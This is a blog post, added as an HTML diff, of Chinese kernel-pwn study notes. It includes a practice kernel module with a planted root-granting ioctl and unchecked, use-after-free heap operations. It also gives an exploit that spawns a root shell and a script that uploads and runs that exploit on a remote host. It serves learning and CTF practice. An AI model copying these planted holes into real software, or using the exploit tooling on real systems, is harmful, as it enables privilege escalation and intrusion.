@@ -1,0 +1,594 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Kernel Pwn 学习笔记 | Erik_Aoi</title>
+    <meta name="author" content="Kanade" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/lib/toc.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ERIK_AOI</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ERIK_AOI</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+
+            <div class="article-container">
+    
+    <aside class="toc-wrapper">
+        <div class="toc-content">
+            <div class="toc-title">
+                <i class="fa-solid fa-list"></i>
+                <span>目录</span>
+            </div>
+            <ol class="toc-list"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-list-text">调试</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#my-module-c"><span class="toc-list-text">my_module.c</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#exp-c"><span class="toc-list-text">exp.c</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#exp-py"><span class="toc-list-text">exp.py</span></a></li></ol>
+        </div>
+    </aside>
+    
+    <div class="article">
+        <div>
+            <h1>Kernel Pwn 学习笔记</h1>
+        </div>
+        <div class="info">
+            <span class="date">
+                <span class="icon">
+                    <i class="fa-solid fa-calendar fa-fw"></i>
+                </span>
+                2026/3/1
+            </span>
+            
+            
+            <span class="tags">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                
+                
+                <span class="tag">
+                    
+                    <a href="/tags/pwn/" style="color: #ffa2c4">
+                        pwn
+                    </a>
+                </span>
+                
+                <span class="tag">
+                    
+                    <a href="/tags/kernel/" style="color: #03a9f4">
+                        kernel
+                    </a>
+                </span>
+                
+            </span>
+            
+        </div>
+    
+    <div class="content" v-pre>
+        <p>参考文献:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45030965/article/details/131411669">https://blog.csdn.net/weixin_45030965/article/details/131411669</a><br><a target="_blank" rel="noopener" href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/">https://kiprey.github.io/2021/10/kernel_pwn_introduction/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45030965/article/details/131411669">https://blog.csdn.net/weixin_45030965/article/details/131411669</a></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>boot.sh 添加调试 (-gdb tcp::1234)：</p>
+<pre><code class="bash">#!/bin/bash
+qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39; -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234
+</code></pre>
+<p>如果是平时学习，可以自己编译出带符号的内核、自己写有洞的模块并测试，调试起来是非常舒服的；</p>
+<p>而对于做题来说，则需要用 extract-vmlinux 提取 vmlinux，用 vmlinux_to_elf 恢复函数名，才能带函数名进行调试。</p>
+<p>笔者更喜欢写两个文件： exp.c 和 exp.py，exp.c 是名副其实的exp，而 exp.py 用来打包、启动并调试；启动后Ctrl+c停在native_safe_halt处，接着在sys_execve处下断点，最后运行exp。</p>
+<p>这里附上本人学习用的模块源码和脚本。</p>
+<h3 id="my-module-c"><a href="#my-module-c" class="headerlink" title="my_module.c"></a>my_module.c</h3><pre><code class="c">#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+#include &lt;linux/fs.h&gt;
+#include &lt;linux/cdev.h&gt;
+#include &lt;linux/uaccess.h&gt;
+#include &lt;linux/miscdevice.h&gt;
+#include &lt;linux/cred.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/mm.h&gt;
+
+#define DEVICE_NAME &quot;debug_module&quot;
+#define IOCTL_GET_ROOT 0xdeadbeef
+#define IOCTL_GET_PHYS 0xcafebabe
+#define IOCTL_HEAP_OP 0xfeedface
+
+struct phys_query &#123;
+    unsigned long vaddr;
+    unsigned long long paddr;
+&#125;;
+
+struct heap_op &#123;
+    size_t idx;
+    size_t op; // 0: alloc, 1: free
+    size_t size; // for alloc
+&#125;;
+void* heap_list[16] = &#123;0&#125;;
+
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;Test Author&quot;);
+MODULE_DESCRIPTION(&quot;A kernel module for debug, DONT USE IN PRODUCTION&quot;);
+
+static long do_get_root(void)
+&#123;
+    struct cred *new_creds;
+
+    new_creds = prepare_creds();
+
+    if (!new_creds) &#123;
+        printk(KERN_ERR &quot;[debug] Failed to prepare new credentials\n&quot;);
+        return -ENOMEM;
+    &#125;
+    
+    new_creds-&gt;uid.val = new_creds-&gt;gid.val = 0;
+    new_creds-&gt;euid.val = new_creds-&gt;egid.val = 0;
+    new_creds-&gt;suid.val = new_creds-&gt;sgid.val = 0;
+    new_creds-&gt;fsuid.val = new_creds-&gt;fsgid.val = 0;
+
+    commit_creds(new_creds);
+    printk(KERN_INFO &quot;[debug] root! granted to PID %d\n&quot;, current-&gt;pid);
+    return 0;
+&#125;
+
+static long do_get_phys(unsigned long arg)
+&#123;
+    struct phys_query req;
+    struct page *page = NULL;
+    int res;
+
+    if (copy_from_user(&amp;req, (void __user *)arg, sizeof(req)))&#123;
+        printk(KERN_ERR &quot;[debug] Failed to copy data from user\n&quot;);
+        return -EFAULT;
+    &#125;
+
+    if (res = get_user_pages_fast(req.vaddr, 1, 0, &amp;page)) &#123;
+        printk(KERN_ERR &quot;[debug] get_user_pages_fast failed for 0x%lx: %d\n&quot;, req.vaddr, res);
+        return -EFAULT;
+    &#125;
+
+    req.paddr = page_to_phys(page) + (req.vaddr &amp; ~PAGE_MASK);
+    put_page(page); 
+
+    if (copy_to_user((void __user *)arg, &amp;req, sizeof(req)))&#123;
+        printk(KERN_ERR &quot;[debug] Failed to copy data to user\n&quot;);
+        return -EFAULT;
+    &#125;
+
+    printk(KERN_INFO &quot;[debug] vaddr: 0x%lx -&gt; paddr: 0x%llx\n&quot;, req.vaddr, req.paddr);
+    return 0;
+&#125;
+
+static long do_heap_op(unsigned long arg)
+&#123;
+    struct heap_op req;
+    if (copy_from_user(&amp;req, (void __user *)arg, sizeof(req)))&#123;
+        printk(KERN_ERR &quot;[debug] Failed to copy data from user\n&quot;);
+        return -EFAULT;
+    &#125;
+    switch (req.op)&#123;
+        case 1: // alloc
+            if (heap_list[req.idx]) &#123;
+                printk(KERN_ERR &quot;[debug] Heap slot %zu already allocated\n&quot;, req.idx);
+                return -EINVAL;
+            &#125;
+            heap_list[req.idx] = kmalloc(req.size, GFP_KERNEL);
+            if (!heap_list[req.idx]) &#123;
+                printk(KERN_ERR &quot;[debug] Failed to allocate heap slot %zu\n&quot;, req.idx);
+                return -ENOMEM;
+            &#125;
+            printk(KERN_INFO &quot;[debug] Allocated %zu bytes at heap slot %zu\n&quot;, req.size, req.idx);
+            break;
+        case 2: // free
+            if (!heap_list[req.idx]) &#123;
+                printk(KERN_ERR &quot;[debug] Heap slot %zu is not allocated\n&quot;, req.idx);
+                return -EINVAL;
+            &#125;
+            kfree(heap_list[req.idx]);
+            printk(KERN_INFO &quot;[debug] Freed heap slot %zu\n&quot;, req.idx);
+            break;
+        case 3: //edit
+            if (!heap_list[req.idx]) &#123;
+                printk(KERN_ERR &quot;[debug] Heap slot %zu is not allocated\n&quot;, req.idx);
+                return -EINVAL;
+            &#125;
+            if (copy_from_user(heap_list[req.idx], (void __user *)arg + sizeof(req), req.size))&#123;
+                printk(KERN_ERR &quot;[debug] Failed to copy data from user to heap slot %zu\n&quot;, req.idx);
+                return -EFAULT;
+            &#125;
+            printk(KERN_INFO &quot;[debug] Edited heap slot %zu with %zu bytes\n&quot;, req.idx, req.size);
+            break;
+        case 4: // show
+            if (!heap_list[req.idx]) &#123;
+                printk(KERN_ERR &quot;[debug] Heap slot %zu is not allocated\n&quot;, req.idx);
+                return -EINVAL;
+            &#125;
+            if (copy_to_user((void __user *)arg + sizeof(req), heap_list[req.idx], req.size))&#123;
+                printk(KERN_ERR &quot;[debug] Failed to copy data from heap slot %zu to user\n&quot;, req.idx);
+                return -EFAULT;
+            &#125;
+            printk(KERN_INFO &quot;[debug] Showed heap slot %zu with %zu bytes\n&quot;, req.idx, req.size);
+            break;
+        default:
+            printk(KERN_ERR &quot;[debug] Invalid heap operation: %zu\n&quot;, req.op);
+            return -EINVAL;
+    &#125; 
+    return 0;
+&#125;
+
+static long my_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+&#123;
+    switch (cmd) &#123;
+        case IOCTL_GET_ROOT:
+            return do_get_root();
+        case IOCTL_GET_PHYS:
+            return do_get_phys(arg);
+        case IOCTL_HEAP_OP:
+            return do_heap_op(arg);
+        default:
+            break;
+    &#125;
+    return -EINVAL;
+&#125;
+
+static const struct file_operations debug_fops = &#123;
+    .owner = THIS_MODULE,
+    .unlocked_ioctl = my_ioctl,
+&#125;;
+
+static struct miscdevice debug_misc = &#123;
+    .minor = MISC_DYNAMIC_MINOR,
+    .name = DEVICE_NAME,
+    .fops = &amp;debug_fops,
+&#125;;
+
+static int __init debug_init(void)
+&#123;
+    int ret;
+
+    ret = misc_register(&amp;debug_misc);
+    if (ret) &#123;
+        printk(KERN_ERR &quot;[debug] Failed to register misc device\n&quot;);
+        return ret;
+    &#125;
+
+    printk(KERN_INFO &quot;[debug] Module loaded. Device: /dev/%s\n&quot;, DEVICE_NAME);
+    return 0;
+&#125;
+
+static void __exit debug_exit(void)
+&#123;
+    misc_deregister(&amp;debug_misc);
+    printk(KERN_INFO &quot;[debug] Module unloaded\n&quot;);
+&#125;
+
+module_init(debug_init);
+module_exit(debug_exit);
+</code></pre>
+<h3 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h3><pre><code class="python">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+#define IOCTL_GET_ROOT 0xdeadbeef
+
+void info() &#123;
+    int uid = getuid();
+    int gid = getgid();
+    int pid = getpid();
+    printf(&quot;UID: %d, GID: %d, PID: %d\n&quot;, uid, gid, pid);
+    if (uid == 0) &#123;
+        printf(&quot;Pwned!\n&quot;);
+        system(&quot;/bin/sh&quot;);
+    &#125;
+&#125;
+
+void dump(unsigned char* buf, int len) &#123;
+    int i;
+    for (i = 0; i &lt; len; i++) &#123;
+        printf(&quot;%02x&quot;, buf[i]);
+        if (i % 16 == 15) &#123;
+            printf(&quot;\n&quot;);
+        &#125; else  if (i % 16 == 7) &#123;
+            printf(&quot; &quot;);
+        &#125;
+    &#125;
+    printf(&quot;Done.\n&quot;);
+&#125;
+
+int main() &#123;
+    int fd = open(&quot;/dev/safe_module&quot;, O_RDWR);
+    if (fd &lt; 0) &#123;
+        perror(&quot;[-] Open device failed&quot;);
+        exit(1);
+    &#125;
+    printf(&quot;[+] Device opened\n&quot;);
+
+    printf(&quot;[*] Triggering exploit...\n&quot;);
+    if (ioctl(fd, IOCTL_GET_ROOT, 0) &lt; 0) &#123;
+        perror(&quot;[-] Ioctl failed&quot;);
+        close(fd);
+        exit(1);
+    &#125;
+    printf(&quot;[+] Exploit triggered\n&quot;);
+
+    close(fd);
+    info();
+    return 0;
+&#125;
+</code></pre>
+<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre><code class="python">#!/usr/bin/env python3
+import os
+import sys
+import shutil
+from pwn import *
+
+# making .bak
+
+bzImage = &quot;./bzImage&quot;
+fs = &quot;./rootfs.cpio&quot;
+vmlinux = &quot;~/pwn/kernel/linux-6.18.5/vmlinux&quot;
+
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.arch = &#39;amd64&#39;
+
+if not os.path.exists(&quot;./bzImage.bak&quot;):
+    shutil.copy(bzImage, &quot;./bzImage.bak&quot;)
+
+if not os.path.exists(&quot;./rootfs.cpio.bak&quot;):
+    shutil.copy(fs, &quot;./rootfs.cpio.bak&quot;)
+
+if args.GDB:
+    # compile exp.c
+    os.system(&quot;gcc -o exp exp.c -g --static &amp;&amp; chmod +777 exp&quot;)
+    # cp
+    if not os.path.exists(&quot;./fs&quot;):
+        raise Exception(&quot;fs directory not found&quot;)
+    os.makedirs(&quot;./fs/tmp&quot;, exist_ok=True)
+    shutil.copy(&quot;./exp&quot;, &quot;./fs/tmp/exp&quot;)
+    # make cpio
+    os.system(&quot;cd fs &amp;&amp; find . | cpio -o -H newc &gt; ../rootfs.cpio&quot;)
+    # run qemu
+    io = process(&quot;./boot.sh&quot;)
+    
+    # start gdb
+    gdbscript = f&#39;&#39;&#39;
+    target remote :1234
+    &#39;&#39;&#39;
+    
+    # Write gdbscript to a temporary file
+    with open(&quot;/tmp/gdbscript&quot;, &quot;w&quot;) as f:
+        f.write(gdbscript)
+        
+    # Launch gdb in a new terminal using tmux
+    os.system(f&quot;tmux splitw -h &#39;gdb -x /tmp/gdbscript &#123;vmlinux&#125;&#39;&quot;)
+    
+    io.interactive()
+
+if args.REMOTE:
+    # compile exp.c
+    context.log_level = &#39;info&#39;
+    os.system(&quot;musl-gcc -o exp exp.c -static -Os -s -fno-ident -fno-asynchronous-unwind-tables -Wl,--build-id=none &amp;&amp; chmod +777 exp&quot;)
+
+    with open(&quot;exp&quot;, &quot;rb&quot;) as f:
+        con = f.read()
+    
+    pay = base64.b64encode(con).decode()
+    io = conn = remote(&#39;101.42.41.80&#39;, 32864)
+    io.sendline()
+    io.recvuntil(b&#39;$&#39;)
+    io.sendline(b&#39;cd /tmp&#39;)
+    chunk_size = 800
+    total = len(pay)
+
+    for i in range(0, total, chunk_size):
+        chunk = pay[i:i+chunk_size]
+        io.sendline(f&#39;echo &quot;&#123;chunk&#125;&quot; &gt;&gt; exp.b64&#39;.encode())
+        time.sleep(0.05)
+        if i % (chunk_size * 5) == 0:
+            log.info(f&quot;Progress: &#123;i&#125;/&#123;total&#125; bytes&quot;)
+
+    io.sendline(b&#39;base64 -d exp.b64 &gt; exp&#39;)
+    io.sendline(b&#39;chmod +x exp&#39;)
+    io.sendline(b&#39;rm exp.b64&#39;)
+    log.success(&quot;File uploaded successfully!&quot;)
+    io.sendline(b&#39;./exp&#39;)
+
+    io.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+    </div>
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2025 - 2026 Erik_Aoi
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Kanade
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/cursor.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
